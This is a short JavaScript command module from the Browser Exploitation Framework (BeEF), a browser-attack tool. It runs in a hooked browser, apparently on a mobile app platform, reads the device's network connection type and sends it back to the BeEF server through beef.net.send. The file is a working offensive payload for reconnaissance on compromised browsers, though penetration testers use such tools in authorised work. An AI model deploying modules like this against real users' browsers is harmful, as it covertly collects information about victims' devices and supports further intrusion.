/*
 * Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
 * Browser Exploitation Framework (BeEF) - http://beefproject.com
 * See the file 'doc/COPYING' for copying permission
 */

beef.execute(function() {
    var connection_type;

    getConnectionType = function() {
        var states = {};
        states[Connection.UNKNOWN] = 'Unknown connection';
        states[Connection.ETHERNET] = 'Ethernet connection';
        states[Connection.WIFI] = 'WiFi connection';
        states[Connection.CELL_2G] = 'Cell 2G connection';
        states[Connection.CELL_3G] = 'Cell 3G connection';
        states[Connection.CELL_4G] = 'Cell 4G connection';
        states[Connection.NONE] = 'No network connection';
        return states[navigator.network.connection.type];
    }

    try {
      connection_type = getConnectionType();
    } catch(e) {
      connection_type = "Unable to determine connection type."
    }

    beef.net.send("<%= @command_url %>", <%= @command_id %>, "connection_type="+connection_type);
});
